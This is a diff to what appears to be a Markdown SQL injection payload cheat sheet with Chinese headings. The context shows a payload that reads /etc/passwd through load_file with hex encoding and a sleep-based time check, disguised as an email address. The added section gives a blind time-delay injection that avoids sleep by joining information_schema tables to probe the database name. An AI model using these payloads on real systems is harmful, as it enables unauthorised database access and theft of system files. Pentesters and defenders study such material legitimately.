@@ -893,7 +893,12 @@ select--\r\n* from--\r\npg_database;
 'or((load_file(0x2f6574632f706173737764))like'%root%'and(sleep(1)))or'lda@123.com
 ```
 
-
+#### 不使用sleep的延时注入
+```txt
+# 使用笛卡尔积的子查询
+admin'+((database()LIKE'a%')AND(SELECT(count(1))FROM(information_schema.tables)JOIN(information_schema.columns)))+'@x.com
+# regexp
+```
 
 #### 可用函数和变量
 
